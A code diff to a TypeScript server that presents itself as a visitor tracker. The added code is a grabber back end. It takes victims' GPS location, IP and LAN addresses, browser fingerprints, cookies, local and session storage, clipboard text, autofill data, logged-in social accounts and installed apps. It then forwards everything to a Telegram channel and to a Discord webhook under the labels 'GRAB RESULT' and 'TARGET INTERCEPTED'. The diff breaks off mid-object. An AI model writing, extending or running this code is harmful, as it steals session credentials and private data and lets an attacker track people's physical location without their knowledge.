@@ -21,7 +21,6 @@ function parseUserAgent(ua: string): { browser: string; os: string; deviceType: 
   if (/mobile|android|iphone|ipad|tablet/i.test(ua)) {
     deviceType = /tablet|ipad/i.test(ua) ? "Tablet" : "Mobile";
   }
-
   if (/edg\//i.test(ua)) browser = "Edge";
   else if (/chrome/i.test(ua) && !/chromium/i.test(ua)) browser = "Chrome";
   else if (/firefox/i.test(ua)) browser = "Firefox";
@@ -40,36 +39,21 @@ function parseUserAgent(ua: string): { browser: string; os: string; deviceType: 
 
 function getClientIp(req: any): string {
   const forwarded = req.headers["x-forwarded-for"];
-  if (forwarded) {
-    return String(forwarded).split(",")[0].trim();
-  }
+  if (forwarded) return String(forwarded).split(",")[0].trim();
   return req.ip ?? req.socket?.remoteAddress ?? "Unknown";
 }
 
-// ── MarkdownV2 helpers ─────────────────────────────────────────────────────
+// ── MarkdownV2 helpers (Telegram) ──────────────────────────────────────────
 
-/** Escape all MarkdownV2 special characters in raw content */
 function esc(s: unknown): string {
   return String(s ?? "").replace(/([_*[\]()~`>#+\-=|{}.!\\])/g, "\\$&");
 }
-
-/** Bold section header with emoji, e.g. "🌐 *Network*" */
 function hdr(emoji: string, title: string): string {
   return `${emoji} *${esc(title)}*`;
 }
-
-/**
- * Blockquote block — each line prefixed with ">".
- * Content inside blockquotes still needs MarkdownV2 escaping.
- */
 function bq(lines: string[]): string {
-  return lines
-    .filter((l) => l !== "")
-    .map((l) => `>${l}`)
-    .join("\n");
+  return lines.filter(Boolean).map(l => `>${l}`).join("\n");
 }
-
-/** Build one section: header + blockquoted lines, or nothing if no lines */
 function section(emoji: string, title: string, lines: string[]): string {
   const rows = lines.filter(Boolean);
   if (!rows.length) return "";
@@ -78,54 +62,36 @@ function section(emoji: string, title: string, lines: string[]): string {
 
 // ── Telegram helpers ───────────────────────────────────────────────────────
 
-async function tgSendText(token: string, chatId: string, text: string): Promise<void> {
+async function tgSend(token: string, chatId: string, text: string): Promise<void> {
   try {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: "MarkdownV2",
-        disable_web_page_preview: true,
-      }),
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "MarkdownV2", disable_web_page_preview: true }),
     });
-    if (!res.ok) {
-      const body = await res.text().catch(() => "");
-      logger.warn({ status: res.status, body }, "Telegram sendMessage failed");
-    }
-  } catch (err) {
-    logger.warn({ err }, "Telegram sendMessage error");
-  }
+    if (!res.ok) logger.warn({ status: res.status, body: await res.text().catch(() => "") }, "TG sendMessage failed");
+  } catch (err) { logger.warn({ err }, "TG sendMessage error"); }
 }
 
-interface MultipartField {
+interface MPField {
   name: string;
   value?: string;
   file?: { data: Buffer; filename: string; contentType: string };
 }
 
-function buildMultipart(fields: MultipartField[], boundary: string): Buffer {
+function buildMultipart(fields: MPField[], boundary: string): Buffer {
   const CRLF = "\r\n";
   const parts: Buffer[] = [];
-
-  for (const field of fields) {
+  for (const f of fields) {
     parts.push(Buffer.from(`--${boundary}${CRLF}`));
-    if (field.file) {
-      parts.push(
-        Buffer.from(
-          `Content-Disposition: form-data; name="${field.name}"; filename="${field.file.filename}"${CRLF}` +
-            `Content-Type: ${field.file.contentType}${CRLF}${CRLF}`,
-        ),
-      );
-      parts.push(field.file.data);
+    if (f.file) {
+      parts.push(Buffer.from(
+        `Content-Disposition: form-data; name="${f.name}"; filename="${f.file.filename}"${CRLF}` +
+        `Content-Type: ${f.file.contentType}${CRLF}${CRLF}`
+      ));
+      parts.push(f.file.data);
     } else {
-      parts.push(
-        Buffer.from(
-          `Content-Disposition: form-data; name="${field.name}"${CRLF}${CRLF}` +
-            String(field.value ?? ""),
-        ),
-      );
+      parts.push(Buffer.from(`Content-Disposition: form-data; name="${f.name}"${CRLF}${CRLF}${f.value ?? ""}`));
     }
     parts.push(Buffer.from(CRLF));
   }
@@ -133,92 +99,119 @@ function buildMultipart(fields: MultipartField[], boundary: string): Buffer {
   return Buffer.concat(parts);
 }
 
-async function telegramMultipartPost(
-  token: string,
-  method: string,
-  fields: MultipartField[],
-): Promise<void> {
-  const boundary = `TGBoundary${Date.now()}${Math.random().toString(36).slice(2)}`;
+async function tgMultipart(token: string, method: string, fields: MPField[]): Promise<void> {
+  const boundary = `TGB${Date.now()}${Math.random().toString(36).slice(2)}`;
   const body = buildMultipart(fields, boundary);
-
   const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
     method: "POST",
-    headers: {
-      "Content-Type": `multipart/form-data; boundary=${boundary}`,
-      "Content-Length": String(body.byteLength),
-    },
+    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": String(body.byteLength) },
     body,
   });
+  if (!res.ok) logger.warn({ method, status: res.status, body: await res.text().catch(() => "") }, "TG multipart failed");
+}
 
-  if (!res.ok) {
-    const text = await res.text().catch(() => "(unreadable)");
-    logger.warn({ method, status: res.status, body: text }, "Telegram API error");
-  }
+// ── Discord helpers ────────────────────────────────────────────────────────
+
+const DISCORD_COLOR = 0x00e676; // bright green
+
+async function discordSendJSON(webhookUrl: string, payload: object): Promise<void> {
+  try {
+    const res = await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+    if (!res.ok) logger.warn({ status: res.status, body: await res.text().catch(() => "") }, "Discord webhook failed");
+  } catch (err) { logger.warn({ err }, "Discord webhook error"); }
+}
+
+async function discordSendFile(
+  webhookUrl: string,
+  fileData: Buffer,
+  filename: string,
+  contentType: string,
+  embed: object,
+): Promise<void> {
+  try {
+    const boundary = `DCB${Date.now()}`;
+    const jsonPart = JSON.stringify({ username: "GHOST_NET", embeds: [embed] });
+    const parts: Buffer[] = [
+      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n${jsonPart}\r\n`),
+      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n`),
+      fileData,
+      Buffer.from(`\r\n--${boundary}--\r\n`),
+    ];
+    const body = Buffer.concat(parts);
+    const res = await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": String(body.byteLength) },
+      body,
+    });
+    if (!res.ok) logger.warn({ status: res.status, body: await res.text().catch(() => "") }, "Discord file upload failed");
+  } catch (err) { logger.warn({ err }, "Discord file error"); }
 }
 
 // ── Geocode helper ─────────────────────────────────────────────────────────
 
 async function reverseGeocode(lat: number, lng: number): Promise<{ country: string | null; city: string | null }> {
   try {
-    const geoRes = await fetch(
+    const r = await fetch(
       `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
-      {
-        headers: { "User-Agent": "VisitorTracker/1.0" },
-        signal: AbortSignal.timeout(3000),
-      }
+      { headers: { "User-Agent": "VisitorTracker/1.0" }, signal: AbortSignal.timeout(3500) }
     );
-    if (geoRes.ok) {
-      const geo = await geoRes.json() as any;
+    if (r.ok) {
+      const geo = await r.json() as any;
       return {
         country: geo.address?.country ?? null,
         city: geo.address?.city ?? geo.address?.town ?? geo.address?.village ?? geo.address?.county ?? null,
       };
     }
-  } catch {
-    // Non-fatal
-  }
+  } catch {}
   return { country: null, city: null };
+}
+
+// ── Source label helper ────────────────────────────────────────────────────
+
+function sourceEmoji(source: string): string {
+  const s = (source ?? "").toLowerCase();
+  if (s.includes("facebook")) return "📘";
+  if (s.includes("instagram")) return "📷";
+  if (s.includes("telegram")) return "✈️";
+  if (s.includes("discord")) return "🎮";
+  if (s.includes("twitter") || s.includes("x")) return "🐦";
+  if (s.includes("tiktok")) return "🎵";
+  if (s.includes("youtube")) return "▶️";
+  if (s.includes("reddit")) return "🔴";
+  if (s.includes("whatsapp")) return "💬";
+  if (s.includes("search")) return "🔍";
+  if (s.includes("direct")) return "🔗";
+  return "🌐";
 }
 
 // ── POST /visits ───────────────────────────────────────────────────────────
 
 router.post("/visits", async (req, res) => {
   const parsed = LogVisitBody.safeParse(req.body);
-  if (!parsed.success) {
-    return res.status(400).json({ error: "Invalid request body" });
-  }
+  if (!parsed.success) return res.status(400).json({ error: "Invalid request body" });
 
-  const { latitude, longitude, accuracy, altitude, referrer } = parsed.data;
+  const { latitude, longitude, accuracy, altitude, referrer, source, sourceName } = parsed.data;
   const ua = req.headers["user-agent"] ?? "";
   const { browser, os, deviceType } = parseUserAgent(ua);
   const ip = getClientIp(req);
 
   let country: string | null = null;
   let city: string | null = null;
-
   if (latitude != null && longitude != null) {
     const geo = await reverseGeocode(latitude, longitude);
-    country = geo.country;
-    city = geo.city;
+    country = geo.country; city = geo.city;
   }
 
-  const [visit] = await db
-    .insert(visitsTable)
-    .values({
-      ip,
-      latitude: latitude ?? null,
-      longitude: longitude ?? null,
-      accuracy: accuracy ?? null,
-      altitude: altitude ?? null,
-      country,
-      city,
-      userAgent: ua || null,
-      browser,
-      os,
-      deviceType,
-      referrer: referrer ?? null,
-    })
-    .returning();
+  const [visit] = await db.insert(visitsTable).values({
+    ip, latitude: latitude ?? null, longitude: longitude ?? null,
+    accuracy: accuracy ?? null, altitude: altitude ?? null,
+    country, city, userAgent: ua || null, browser, os, deviceType,
+    referrer: referrer ?? null, source: source ?? null, sourceName: sourceName ?? null,
+  }).returning();
 
   return res.status(201).json({ ...visit, createdAt: visit.createdAt.toISOString() });
 });
@@ -226,49 +219,28 @@ router.post("/visits", async (req, res) => {
 // ── GET /visits ────────────────────────────────────────────────────────────
 
 router.get("/visits", async (_req, res) => {
-  const visits = await db
-    .select()
-    .from(visitsTable)
-    .orderBy(desc(visitsTable.createdAt));
-
-  return res.json(visits.map((v) => ({ ...v, createdAt: v.createdAt.toISOString() })));
+  const visits = await db.select().from(visitsTable).orderBy(desc(visitsTable.createdAt));
+  return res.json(visits.map(v => ({ ...v, createdAt: v.createdAt.toISOString() })));
 });
 
 // ── GET /visits/stats ──────────────────────────────────────────────────────
 
 router.get("/visits/stats", async (_req, res) => {
-  const allVisits = await db
-    .select()
-    .from(visitsTable)
-    .orderBy(desc(visitsTable.createdAt));
-
-  const totalVisits = allVisits.length;
-  const uniqueIps = new Set(allVisits.map((v) => v.ip).filter(Boolean)).size;
-  const withLocation = allVisits.filter((v) => v.latitude != null && v.longitude != null).length;
+  const all = await db.select().from(visitsTable).orderBy(desc(visitsTable.createdAt));
+  const totalVisits = all.length;
+  const uniqueIps = new Set(all.map(v => v.ip).filter(Boolean)).size;
+  const withLocation = all.filter(v => v.latitude != null).length;
 
   const countryMap = new Map<string, number>();
-  for (const v of allVisits) {
-    const key = v.country ?? "Unknown";
-    countryMap.set(key, (countryMap.get(key) ?? 0) + 1);
-  }
-  const topCountries = Array.from(countryMap.entries())
-    .sort((a, b) => b[1] - a[1])
-    .slice(0, 5)
-    .map(([country, count]) => ({ country, count }));
+  for (const v of all) { const k = v.country ?? "Unknown"; countryMap.set(k, (countryMap.get(k) ?? 0) + 1); }
+  const topCountries = Array.from(countryMap.entries()).sort((a, b) => b[1] - a[1]).slice(0, 5).map(([country, count]) => ({ country, count }));
 
   const dayMap = new Map<string, number>();
   const now = new Date();
-  for (let i = 13; i >= 0; i--) {
-    const d = new Date(now);
-    d.setDate(d.getDate() - i);
-    dayMap.set(d.toISOString().slice(0, 10), 0);
-  }
-  for (const v of allVisits) {
-    const day = v.createdAt.toISOString().slice(0, 10);
-    if (dayMap.has(day)) dayMap.set(day, (dayMap.get(day) ?? 0) + 1);
-  }
+  for (let i = 13; i >= 0; i--) { const d = new Date(now); d.setDate(d.getDate() - i); dayMap.set(d.toISOString().slice(0, 10), 0); }
+  for (const v of all) { const day = v.createdAt.toISOString().slice(0, 10); if (dayMap.has(day)) dayMap.set(day, (dayMap.get(day) ?? 0) + 1); }
   const visitsPerDay = Array.from(dayMap.entries()).map(([date, count]) => ({ date, count }));
-  const recentVisits = allVisits.slice(0, 10).map((v) => ({ ...v, createdAt: v.createdAt.toISOString() }));
+  const recentVisits = all.slice(0, 10).map(v => ({ ...v, createdAt: v.createdAt.toISOString() }));
 
   return res.json({ totalVisits, uniqueIps, withLocation, recentVisits, topCountries, visitsPerDay });
 });
@@ -277,206 +249,277 @@ router.get("/visits/stats", async (_req, res) => {
 
 router.post("/visits/deviceinfo", async (req, res) => {
   const parsed = SendDeviceInfoBody.safeParse(req.body);
-  if (!parsed.success) {
-    return res.status(400).json({ error: "Invalid body" });
-  }
+  if (!parsed.success) return res.status(400).json({ error: "Invalid body" });
 
   const info = parsed.data as Record<string, unknown>;
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHANNEL_ID;
+  const tgToken = process.env.TELEGRAM_BOT_TOKEN;
+  const tgChat  = process.env.TELEGRAM_CHANNEL_ID;
+  const dcHook  = process.env.DISCORD_WEBHOOK_URL;
 
-  if (token && chatId) {
-    const ip = getClientIp(req);
-    const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });
+  const ip = getClientIp(req);
+  const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });
 
-    const lat = info._lat ? Number(info._lat) : null;
-    const lng = info._lng ? Number(info._lng) : null;
-    const acc = info._accuracy ? Number(info._accuracy) : null;
-    const hasGps = lat != null && lng != null && !isNaN(lat) && !isNaN(lng);
-    const mapsUrl = hasGps ? `https://www.google.com/maps?q=${lat},${lng}` : null;
+  const lat = info._lat ? Number(info._lat) : null;
+  const lng = info._lng ? Number(info._lng) : null;
+  const acc = info._accuracy ? Number(info._accuracy) : null;
+  const hasGps = lat != null && lng != null && !isNaN(lat) && !isNaN(lng);
+  const mapsUrl = hasGps ? `https://www.google.com/maps?q=${lat},${lng}` : null;
 
-    let geoCity = "";
-    let geoCountry = "";
-    if (hasGps) {
-      const geo = await reverseGeocode(lat!, lng!);
-      geoCity = geo.city ?? "";
-      geoCountry = geo.country ?? "";
-    }
+  const rawSource = String(info._source ?? "");
+  const rawSourceName = String(info._sourceName ?? "");
 
-    const v = (val: unknown) => (val && val !== "unknown" ? String(val) : null);
+  let geoCity = "";
+  let geoCountry = "";
+  if (hasGps) {
+    const geo = await reverseGeocode(lat!, lng!);
+    geoCity = geo.city ?? "";
+    geoCountry = geo.country ?? "";
+  }
 
-    // ── Main grab result ──────────────────────────────────────────────────
+  const v = (val: unknown) => (val && String(val) !== "unknown" && String(val) !== "?" ? String(val) : null);
+
+  // ══════════════════════════════════════════════════════════
+  // Build Telegram MarkdownV2 message
+  // ══════════════════════════════════════════════════════════
+  if (tgToken && tgChat) {
     const sections: string[] = [];
 
-    // Header
-    sections.push(`🎯 *${esc("GRAB RESULT")}*`);
+    // ── Header with source ──────────────────────────────────
+    const emoji = sourceEmoji(rawSource);
+    let headerLine = `🎯 *${esc("GRAB RESULT")}*`;
+    if (rawSource) {
+      headerLine += `\n\n${hdr(emoji, rawSource)}`;
+      if (rawSourceName) headerLine += `\n${bq([`👤 ${esc(rawSourceName)}`])}`;
+    }
+    sections.push(headerLine);
 
-    // Network / IP
+    // ── Network ─────────────────────────────────────────────
     const netLines: string[] = [`IP\\: \`${esc(ip)}\``];
     if (hasGps) {
       netLines.push(`LAT\\: \`${esc(lat!.toFixed(6))}\``);
       netLines.push(`LNG\\: \`${esc(lng!.toFixed(6))}\``);
       if (acc != null) netLines.push(`ACC\\: \`${esc(Math.round(acc))}m\``);
-      netLines.push(`MAP\\: [Open Google Maps](${esc(mapsUrl!)})`);
+      netLines.push(`MAP\\: [Google Maps](${esc(mapsUrl!)})`);
     } else {
       netLines.push(`GPS\\: No location`);
     }
-    if (geoCity || geoCountry) {
-      netLines.push(`GEO\\: ${esc([geoCity, geoCountry].filter(Boolean).join(", "))}`);
-    }
-    if (v(info["netType"])) {
-      let netStr = String(info["netType"]);
-      if (info["netDownlink"]) netStr += ` • ${info["netDownlink"]}`;
-      if (info["netRtt"]) netStr += ` • RTT ${info["netRtt"]}`;
+    if (geoCity || geoCountry) netLines.push(`GEO\\: ${esc([geoCity, geoCountry].filter(Boolean).join(", "))}`);
+    if (v(info.netType)) {
+      let netStr = String(info.netType);
+      if (info.netDownlink) netStr += ` • ${info.netDownlink}`;
+      if (info.netRtt) netStr += ` • RTT ${info.netRtt}`;
       netLines.push(`NET\\: ${esc(netStr)}`);
-      if (info["dataSaver"]) netLines.push(`Data Saver\\: ON`);
     }
-    if (v(info["localIPs"]) && info["localIPs"] !== "none") {
-      netLines.push(`LAN\\: \`${esc(info["localIPs"])}\``);
-    }
+    if (v(info.localIPs) && info.localIPs !== "none") netLines.push(`LAN\\: \`${esc(info.localIPs)}\``);
     sections.push(section("🌐", "Network", netLines));
 
-    // Display
-    const displayLines: string[] = [];
-    if (v(info["screenRes"])) displayLines.push(`Screen\\: ${esc(info["screenRes"])} @${esc(info["pixelRatio"])}x`);
-    if (v(info["orientation"])) displayLines.push(`Orient\\: ${esc(info["orientation"])}`);
-    if (info["touchPoints"]) displayLines.push(`Touch\\: ${esc(info["touchPoints"])} points`);
-    if (v(info["colorGamut"])) displayLines.push(`Gamut\\: ${esc(info["colorGamut"])}`);
-    if (info["hdr"]) displayLines.push(`HDR\\: ${esc(info["hdr"])}`);
-    if (v(info["refreshRate"])) displayLines.push(`Refresh\\: ${esc(info["refreshRate"])}`);
-    if (info["darkMode"]) displayLines.push(`Theme\\: ${esc(info["darkMode"])}`);
-    sections.push(section("🖥", "Display", displayLines));
+    // ── Display ─────────────────────────────────────────────
+    const dispLines: string[] = [];
+    if (v(info.screenRes)) dispLines.push(`Screen\\: ${esc(info.screenRes)} @${esc(info.pixelRatio)}x`);
+    if (v(info.orientation)) dispLines.push(`Orient\\: ${esc(info.orientation)}`);
+    if (info.touchPoints) dispLines.push(`Touch\\: ${esc(info.touchPoints)} points`);
+    if (v(info.colorGamut)) dispLines.push(`Gamut\\: ${esc(info.colorGamut)}`);
+    if (v(info.refreshRate)) dispLines.push(`Refresh\\: ${esc(info.refreshRate)}`);
+    if (info.darkMode) dispLines.push(`Theme\\: ${esc(info.darkMode)}`);
+    sections.push(section("🖥", "Display", dispLines));
 
-    // Hardware
+    // ── Hardware ─────────────────────────────────────────────
     const hwLines: string[] = [];
-    if (v(info["memory"])) hwLines.push(`RAM\\: ${esc(info["memory"])}`);
-    if (v(info["cpuCores"])) hwLines.push(`CPU\\: ${esc(info["cpuCores"])}`);
-    if (info["battery"]) hwLines.push(`Battery\\: ${esc(info["battery"])} \\(charging\\: ${esc(info["charging"])}\\)`);
-    if (v(info["gpu"])) hwLines.push(`GPU\\: ${esc(info["gpu"])}`);
-    if (v(info["gpuVendor"]) && info["gpuVendor"] !== info["gpu"]) hwLines.push(`Vendor\\: ${esc(info["gpuVendor"])}`);
+    if (v(info.memory)) hwLines.push(`RAM\\: ${esc(info.memory)}`);
+    if (v(info.cpuCores)) hwLines.push(`CPU\\: ${esc(info.cpuCores)}`);
+    if (info.battery) hwLines.push(`Battery\\: ${esc(info.battery)} \\(charging\\: ${esc(info.charging)}\\)`);
+    if (v(info.gpu)) hwLines.push(`GPU\\: ${esc(info.gpu)}`);
+    if (v(info.gpuVendor) && info.gpuVendor !== info.gpu) hwLines.push(`Vendor\\: ${esc(info.gpuVendor)}`);
     sections.push(section("💾", "Hardware", hwLines));
 
-    // Browser
-    const browserLines: string[] = [];
-    if (info["timezone"]) browserLines.push(`TZ\\: ${esc(info["timezone"])}`);
-    if (info["languages"]) browserLines.push(`Lang\\: ${esc(info["languages"])}`);
-    if (info["cookies"]) browserLines.push(`Cookies\\: ${esc(info["cookies"])}`);
-    if (v(info["canvasFP"])) browserLines.push(`Canvas FP\\: \`${esc(info["canvasFP"])}\``);
-    if (v(info["audioFP"])) browserLines.push(`Audio FP\\: \`${esc(info["audioFP"])}\``);
-    sections.push(section("🔑", "Browser", browserLines));
+    // ── Browser ─────────────────────────────────────────────
+    const brLines: string[] = [];
+    if (info.timezone) brLines.push(`TZ\\: ${esc(info.timezone)}`);
+    if (info.languages) brLines.push(`Lang\\: ${esc(info.languages)}`);
+    if (info.cookies) brLines.push(`Cookies\\: ${esc(info.cookies)}`);
+    if (v(info.canvasFP)) brLines.push(`Canvas FP\\: \`${esc(info.canvasFP)}\``);
+    if (v(info.audioFP)) brLines.push(`Audio FP\\: \`${esc(info.audioFP)}\``);
+    sections.push(section("🔑", "Browser", brLines));
 
-    // Camera & Mic
+    // ── Camera & Mic ─────────────────────────────────────────
     const camLines: string[] = [];
-    if (info["cameras"]) camLines.push(`Cameras\\: ${esc(info["cameras"])}`);
-    if (v(info["camModel"]) && info["camModel"] !== "no label") camLines.push(`Cam\\: ${esc(info["camModel"])}`);
-    if (info["mics"]) camLines.push(`Mics\\: ${esc(info["mics"])}`);
-    if (v(info["micModel"]) && info["micModel"] !== "no label") camLines.push(`Mic\\: ${esc(info["micModel"])}`);
-    if (info["permCamera"]) camLines.push(`Cam Perm\\: ${esc(info["permCamera"])}`);
-    if (info["permMic"]) camLines.push(`Mic Perm\\: ${esc(info["permMic"])}`);
+    if (info.cameras) camLines.push(`Cameras\\: ${esc(info.cameras)}`);
+    if (v(info.camModel) && info.camModel !== "no label") camLines.push(`Model\\: ${esc(info.camModel)}`);
+    if (info.mics) camLines.push(`Mics\\: ${esc(info.mics)}`);
+    if (v(info.micModel) && info.micModel !== "no label") camLines.push(`Mic\\: ${esc(info.micModel)}`);
+    if (info.permCamera) camLines.push(`Cam Perm\\: ${esc(info.permCamera)}`);
+    if (info.permMic) camLines.push(`Mic Perm\\: ${esc(info.permMic)}`);
     sections.push(section("📷", "Camera & Mic", camLines));
 
-    // Footer timestamp
     sections.push(`⏱ _${esc(time)}_`);
 
-    const mainMsg = sections.filter(Boolean).join("\n\n");
-    await tgSendText(token, chatId, mainMsg);
+    await tgSend(tgToken, tgChat, sections.filter(Boolean).join("\n\n"));
 
-    // ── Social recon ──────────────────────────────────────────────────────
-    const social = info["social"];
-    if (social && typeof social === "object" && Object.keys(social).length > 0) {
+    // ── Social Recon ─────────────────────────────────────────
+    const social = info.social;
+    if (social && typeof social === "object" && Object.keys(social).length) {
       const entries = Object.entries(social as Record<string, string>);
       const socialLines = entries.map(([platform, status]) => {
-        const badge = status !== "blocked" ? "✓" : "✗";
+        const isLoggedIn = status.includes("logged in");
+        const isSender = status.includes("SENDER");
+        const badge = isSender ? "🎯" : isLoggedIn ? "✓" : "✗";
         return `${badge} ${esc(platform)} — ${esc(status)}`;
       });
       const msg = `${hdr("🌍", "Social Recon")}\n${bq(socialLines)}`;
-      await tgSendText(token, chatId, msg);
+      await tgSend(tgToken, tgChat, msg);
     }
 
-    // ── App detection ─────────────────────────────────────────────────────
-    const apps = info["apps"];
-    if (apps && typeof apps === "object" && Object.keys(apps).length > 0) {
+    // ── App Detection ─────────────────────────────────────────
+    const apps = info.apps;
+    if (apps && typeof apps === "object" && Object.keys(apps).length) {
       const entries = Object.entries(apps as Record<string, string>);
       const installed = entries.filter(([, s]) => s === "installed");
       const rest = entries.filter(([, s]) => s !== "installed");
-      const appLines = [...installed, ...rest].map(([app, status]) => {
-        const badge = status === "installed" ? "✓" : "—";
-        return `${badge} ${esc(app)}`;
-      });
-      const msg = `${hdr("📱", "App Detection")}\n${bq(appLines)}`;
-      await tgSendText(token, chatId, msg);
+      const appLines = [...installed, ...rest].map(([app, status]) =>
+        `${status === "installed" ? "✓" : "—"} ${esc(app)}`
+      );
+      await tgSend(tgToken, tgChat, `${hdr("📱", "App Detection")}\n${bq(appLines)}`);
     }
 
-    // ── Browser storage ───────────────────────────────────────────────────
-    const storage = info["storage"];
-    if (storage && typeof storage === "object" && Object.keys(storage).length > 0) {
+    // ── Browser Storage ───────────────────────────────────────
+    const storage = info.storage;
+    if (storage && typeof storage === "object") {
       const s = storage as Record<string, string>;
-
-      const storageSections: string[] = [hdr("🗄", "Browser Storage")];
-
-      // Cookies
-      const cookieVal = (s["cookies"] || "").trim();
-      storageSections.push(
-        `${hdr("🍪", "Cookies")}\n${bq([esc(cookieVal || "(No cookies)")])}`
-      );
-
-      // LocalStorage
-      const lsVal = (s["localStorage"] || "").trim();
-      storageSections.push(
-        `${hdr("🗃", "LocalStorage")}\n${bq([esc(lsVal || "(Empty)")])}`
-      );
-
-      // SessionStorage
-      const ssVal = (s["sessionStorage"] || "").trim();
-      storageSections.push(
-        `${hdr("📦", "SessionStorage")}\n${bq([esc(ssVal || "(Empty)")])}`
-      );
-
-      // IndexedDB
-      if (s["indexedDB"]) {
-        storageSections.push(
-          `${hdr("💿", "IndexedDB")}\n${bq([esc(s["indexedDB"])])}`
-        );
-      }
-
-      // CacheStorage
-      if (s["cacheStorage"]) {
-        storageSections.push(
-          `${hdr("⚡", "Cache Storage")}\n${bq([esc(s["cacheStorage"])])}`
-        );
-      }
-
-      // Service Workers
-      if (s["serviceWorkers"]) {
-        storageSections.push(
-          `${hdr("⚙", "Service Workers")}\n${bq([esc(s["serviceWorkers"])])}`
-        );
-      }
-
-      await tgSendText(token, chatId, storageSections.join("\n\n"));
+      const parts: string[] = [hdr("🗄", "Browser Storage")];
+      parts.push(`${hdr("🍪", "Cookies")}\n${bq([esc(s.cookies || "(No cookies)")])}`);
+      parts.push(`${hdr("🗃", "LocalStorage")}\n${bq([esc(s.localStorage || "(Empty)")])}`);
+      parts.push(`${hdr("📦", "SessionStorage")}\n${bq([esc(s.sessionStorage || "(Empty)")])}`);
+      if (s.indexedDB) parts.push(`${hdr("💿", "IndexedDB")}\n${bq([esc(s.indexedDB)])}`);
+      if (s.cacheStorage) parts.push(`${hdr("⚡", "Cache Storage")}\n${bq([esc(s.cacheStorage)])}`);
+      if (s.serviceWorkers) parts.push(`${hdr("⚙", "Service Workers")}\n${bq([esc(s.serviceWorkers)])}`);
+      await tgSend(tgToken, tgChat, parts.join("\n\n"));
     }
 
-    // ── Clipboard ─────────────────────────────────────────────────────────
-    const clipboard = info["clipboard"];
+    // ── Clipboard ─────────────────────────────────────────────
+    const clipboard = info.clipboard;
     if (clipboard && typeof clipboard === "object") {
       const c = clipboard as Record<string, string>;
       const clipLines: string[] = [];
-      if (c["text"]) clipLines.push(esc(c["text"].slice(0, 1000)));
-      if (c["selected"]) clipLines.push(`Selected\\: ${esc(c["selected"].slice(0, 500))}`);
-      if (clipLines.length) {
-        const msg = `${hdr("📋", "Clipboard")}\n${bq(clipLines)}`;
-        await tgSendText(token, chatId, msg);
+      if (c.text) clipLines.push(esc(c.text.slice(0, 1000)));
+      if (c.selected) clipLines.push(`Selected\\: ${esc(c.selected.slice(0, 500))}`);
+      if (clipLines.length) await tgSend(tgToken, tgChat, `${hdr("📋", "Clipboard")}\n${bq(clipLines)}`);
+    }
+
+    // ── Autofill ──────────────────────────────────────────────
+    const autofill = info.autofill;
+    if (autofill && typeof autofill === "object" && Object.keys(autofill).length) {
+      const af = autofill as Record<string, string>;
+      const afLines = Object.entries(af).map(([k, val]) => `${esc(k)}\\: ${esc(val)}`);
+      await tgSend(tgToken, tgChat, `${hdr("📝", "Autofill Data")}\n${bq(afLines)}`);
+    }
+  }
+
+  // ══════════════════════════════════════════════════════════
+  // Discord embed
+  // ══════════════════════════════════════════════════════════
+  if (dcHook) {
+    const sourceTag = rawSource ? `${sourceEmoji(rawSource)} ${rawSource}${rawSourceName ? ` — ${rawSourceName}` : ""}` : "Direct";
+
+    const fields: { name: string; value: string; inline: boolean }[] = [];
+
+    // Source
+    fields.push({ name: "📡 Source", value: sourceTag, inline: false });
+
+    // Network
+    fields.push({ name: "🌐 IP", value: `\`${ip}\``, inline: true });
+    if (hasGps) {
+      fields.push({ name: "📍 Coordinates", value: `[${lat!.toFixed(5)}, ${lng!.toFixed(5)}](${mapsUrl})`, inline: true });
+      if (acc != null) fields.push({ name: "🎯 Accuracy", value: `${Math.round(acc)}m`, inline: true });
+    }
+    if (geoCity || geoCountry) {
+      fields.push({ name: "🗺 Location", value: [geoCity, geoCountry].filter(Boolean).join(", "), inline: true });
+    }
+    if (v(info.netType)) {
+      let netStr = String(info.netType);
+      if (info.netDownlink) netStr += ` · ${info.netDownlink}`;
+      if (info.netRtt) netStr += ` · RTT ${info.netRtt}`;
+      fields.push({ name: "📶 Network", value: netStr, inline: true });
+    }
+    if (v(info.localIPs) && info.localIPs !== "none") {
+      fields.push({ name: "🏠 LAN IP", value: `\`${info.localIPs}\``, inline: true });
+    }
+
+    // Device
+    if (v(info.screenRes)) fields.push({ name: "🖥 Screen", value: `${info.screenRes} @${info.pixelRatio}x`, inline: true });
+    if (v(info.memory)) fields.push({ name: "💾 RAM", value: String(info.memory), inline: true });
+    if (v(info.cpuCores)) fields.push({ name: "⚡ CPU", value: String(info.cpuCores), inline: true });
+    if (info.battery) fields.push({ name: "🔋 Battery", value: `${info.battery} (charging: ${info.charging})`, inline: true });
+    if (v(info.gpu)) fields.push({ name: "🎮 GPU", value: String(info.gpu), inline: false });
+
+    // Browser
+    if (info.timezone) fields.push({ name: "🕐 Timezone", value: String(info.timezone), inline: true });
+    if (info.languages) fields.push({ name: "🌍 Languages", value: String(info.languages), inline: true });
+    if (v(info.canvasFP)) fields.push({ name: "🔑 Canvas FP", value: `\`${info.canvasFP}\``, inline: true });
+
+    // Camera perms
+    if (info.permCamera) fields.push({ name: "📷 Cam Perm", value: String(info.permCamera), inline: true });
+    if (info.permMic) fields.push({ name: "🎤 Mic Perm", value: String(info.permMic), inline: true });
+
+    // Map link
+    if (hasGps) {
+      fields.push({ name: "🗺 Map Link", value: `[Open in Google Maps](${mapsUrl})`, inline: false });
+    }
+
+    const embed = {
+      title: "🎯 TARGET INTERCEPTED",
+      color: DISCORD_COLOR,
